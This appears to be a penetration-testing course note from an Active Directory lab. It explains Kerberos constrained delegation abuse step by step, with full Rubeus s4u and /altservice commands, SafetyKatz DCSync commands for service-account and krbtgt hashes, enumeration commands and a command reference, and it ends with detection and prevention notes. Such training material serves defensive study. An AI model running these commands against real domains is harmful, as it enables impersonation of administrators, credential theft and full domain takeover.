# Constrained Delegation

**Date:** 13 August 2026

---

## What is Constrained Delegation?

**Constrained Delegation = Service can impersonate users only to specific services on specific computers.**

Unlike unconstrained delegation:
- ✅ Limited to specified SPNs (Service Principal Names)
- ✅ Defined in `msDS-AllowedToDelegateTo` attribute
- ✅ Only forward to services in that list
- ❌ Cannot delegate to any service (like unconstrained)

---

## What is Protocol Transition?

**Protocol Transition = Service authenticates user via non-Kerberos method, then requests Kerberos ticket.**

Common scenario:
1. User logs into web service with username/password (non-Kerberos)
2. Web service needs to access database
3. Web service requests Kerberos ticket on behalf of user
4. Can delegate access to specified backend services (SQL, CIFS, LDAP)

---

## S4U Extensions

**S4U = Service for User (Kerberos extension)**

### S4U2Self (Service for User to Self)

- Service obtains **forwardable TGS** to itself on behalf of user
- No password needed
- Uses user's principal name only
- Controlled by `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag

**Requirements:**
- Service account must have `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` set
- User account must not be blocked for delegation

### S4U2Proxy (Service for User to Proxy)

- Service forwards TGS to **second service** on behalf of user
- TGS obtained via S4U2Self first
- Which services? Listed in `msDS-AllowedToDelegateTo` attribute
- Second service accepts forwardable ticket

---

## Attack Prerequisites

- **Access to service account** (websvc, adminsrv, etc.)
- **Account has `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`** set
- **msDS-AllowedToDelegateTo populated** with target SPNs
- **Rubeus.exe** for S4U exploitation

---

## Step 1: Enumerate Constrained Delegation

**Using PowerView:**

```powershell
Get-DomainUser -TrustedToAuth
```

Lists users with `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`.

---

```powershell
Get-DomainComputer -TrustedToAuth
```

Lists computers with constrained delegation.

---

**Using ActiveDirectory Module:**

```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

Shows objects with delegation enabled + target SPNs.

---

**Example output:**

```
Name: dcorp-adminsrv$
msDS-AllowedToDelegateTo: {time/dcorp-dc.dollarcorp.moneycorp.local, ldap/dcorp-dc.dollarcorp.moneycorp.local}
```

adminsrv can delegate to time & ldap services on dcorp-dc.

---

## Step 2: Get Service Account Credentials

**Obtain password or hash of service account:**

Option 1: Compromised service account credentials (from memory dump, registry, etc.)

Option 2: DCSync (if DA):

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\dcorp-adminsrv$" "exit"
```

Extract adminsrv$ hash.

---

## Step 3: Exploit S4U2Self + S4U2Proxy

**Request forwardable TGS using S4U2Self & S4U2Proxy:**

```powershell
Rubeus.exe s4u 
  /user:dcorp-adminsrv$ 
  /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 
  /impersonateuser:Administrator 
  /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local 
  /ptt
```

**Parameters:**
- `/user:dcorp-adminsrv$` — Service account
- `/aes256` — AES256 hash of service account
- `/impersonateuser:Administrator` — User to impersonate
- `/msdsspn:time/...` — Service to delegate to (from msDS-AllowedToDelegateTo)
- `/ptt` — Pass-the-ticket (load immediately)

---

## Step 4: Abuse with /altservice Parameter

**CRITICAL: Override target service in TGS (SPN is cleartext in TGS):**

```powershell
Rubeus.exe s4u 
  /user:dcorp-adminsrv$ 
  /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 
  /impersonateuser:Administrator 
  /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local 
  /altservice:ldap 
  /ptt
```

**Why /altservice is powerful:**
- Original delegation: time service only
- /altservice:ldap — Override to LDAP service
- TGS still valid (signed by adminsrv$)
- LDAP service trusts ticket from adminsrv$
- Administrator now has LDAP access to DC

---

## Step 5: Execute Privileged Action

**After ticket loaded (via /ptt), impersonate Administrator:**

**DCSync as Administrator:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

Extract KRBTGT hash (Domain Admin access).

---

**Alternative: Directory access as Administrator**

```powershell
Get-ADUser Administrator
```

Query AD as Administrator.

---

## Complete Attack Workflow

```
1. Enumerate constrained delegation targets
   ↓
2. Identify service account (dcorp-adminsrv$)
   ↓
3. Get service account AES256 hash
   ↓
4. Use S4U2Self to get TGS to itself (as Administrator)
   ↓
5. Use S4U2Proxy to forward TGS to target service
   ↓
6. [ABUSE POINT] Use /altservice to override SPN
   ↓
7. Request LDAP service ticket (not time service)
   ↓
8. Load ticket into memory (/ptt)
   ↓
9. Execute privileged action (DCSync, directory access)
   ↓
10. Extract domain hashes/credentials
```

---

## How S4U2Self + S4U2Proxy Works

```
User: Joe
Service Account: websvc
Delegation Target: CIFS/dcorp-mssql

1. Joe authenticates to websvc with password
2. websvc requests S4U2Self TGS
   - KDC checks websvc.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
   - KDC returns forwardable TGS for Joe → websvc
3. websvc requests S4U2Proxy using TGS
   - KDC checks msDS-AllowedToDelegateTo on websvc
   - Sees CIFS/dcorp-mssql in list
   - Returns TGS for Joe → CIFS/dcorp-mssql
4. websvc uses TGS to authenticate as Joe to CIFS service
5. CIFS service accepts ticket (signed by KDC)
6. websvc now has access to dcorp-mssql as Joe
```

---

## Why /altservice is Game-Changing

**Without /altservice:**
```
msDS-AllowedToDelegateTo: time/dcorp-dc (only this allowed)
Request: S4U2Proxy for time/dcorp-dc
Result: TGS for time service only
Can only access time service
```

**With /altservice:**
```
msDS-AllowedToDelegateTo: time/dcorp-dc (limited)
Request: S4U2Proxy for time/dcorp-dc + /altservice:ldap
Result: TGS signed for LDAP (overrides time)
Can access any service if ticket is accepted
```

**SPN is cleartext in TGS:**
- Service receiving ticket doesn't validate SPN matches
- Only checks ticket signature (valid from adminsrv$)
- Can access unintended services!

---

## Common msDS-AllowedToDelegateTo Values

| Delegation Target | /altservice Abuse |
|---|---|
| time/dcorp-dc | ldap, cifs, host, http |
| host/dcorp-dc | cifs, ldap, http |
| ldap/dcorp-dc | cifs, host |
| http/dcorp-dc | ldap, cifs |

Any of these can be overridden to access sensitive services.

---

## Command Reference

| Task | Command |
|---|---|
| Find users (delegation) | `Get-DomainUser -TrustedToAuth` |
| Find computers (delegation) | `Get-DomainComputer -TrustedToAuth` |
| View delegation targets | `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}` |
| Extract service hash | `SafetyKatz.exe "lsadump::dcsync /user:dcorp\\adminsrv$"` |
| S4U2Self + S4U2Proxy | `Rubeus.exe s4u /user:adminsrv$ /aes256:<hash> /impersonateuser:Administrator /msdsspn:time/dc` |
| S4U with /altservice | `Rubeus.exe s4u /user:adminsrv$ /aes256:<hash> /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap` |
| Load ticket | `/ptt` (in Rubeus s4u command) |
| DCSync | `SafetyKatz.exe "lsadump::dcsync /user:dcorp\\krbtgt"` |

---

## Real-World Scenarios

**Scenario 1: Web to Database**
```
Web service: websvc (constrained delegation)
Allowed: CIFS/sql-server only
Abuse: Set /altservice:ldap → Access LDAP as web service
Result: Directory admin access
```

**Scenario 2: Admin Server**
```
Admin server: adminsrv (constrained delegation)
Allowed: time/dcorp-dc only
Abuse: Set /altservice:ldap → Access DC LDAP
Result: DCSync as administrator
```

---

## Detection

**What logs:**
- TGS request events (4769)
- S4U requests (can be logged)
- Account modification (if delegation added)

**What doesn't log:**
- S4U exploitation (if not monitored)
- /altservice override (SPN is cleartext, hard to detect)
- Ticket usage after /ptt

---

## Prevention

- **Limit constrained delegation** — only if necessary
- **Monitor msDS-AllowedToDelegateTo** — audit delegation targets
- **Restrict service accounts** — minimize who has delegation
- **Monitor S4U events** — Kerberos S4U requests
- **Implement MFA** — reduce impact if service account compromised
- **Monitor "sensitive" users** — flag if used with S4U
- **Resource-based constrained delegation** — more secure alternative

---

## Key Concepts

**Service for User (S4U):**
- Extensions to Kerberos protocol
- Allow services to request tickets on behalf of users
- Two-step process (Self + Proxy)

**Protocol Transition:**
- Service accepts non-Kerberos auth (username/password)
- Requests Kerberos ticket via S4U2Self
- Delegates to backend via S4U2Proxy

**/altservice Abuse:**
- SPN in TGS is cleartext (not validated)
- Can override to access unintended services
- Bypasses msDS-AllowedToDelegateTo restrictions
- Requires service account compromise + S4U capability

---

## Key Takeaway

```
Constrained Delegation = Limited impersonation
But /altservice bypasses limitations!
1. Compromise service account
2. Use S4U2Self to impersonate any user
3. Use S4U2Proxy to access unintended services (/altservice)
4. SPN is cleartext = no validation
5. Effective privilege escalation to DA/EA
```

---

## References

- [Rubeus - S4U Exploitation](https://github.com/GhostPack/Rubeus)
- [Constrained Delegation (Harmj0y)](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [S4U Abuse (Elad Shamir)](https://blog.quest.com/kerberos-unconstrained-delegation-exposures/)
- [Microsoft S4U Documentation](https://docs.microsoft.com/en-us/windows/win32/secauthn/service-for-user)

---

*Next: Learning Objective 16 — Resource-Based Constrained Delegation*
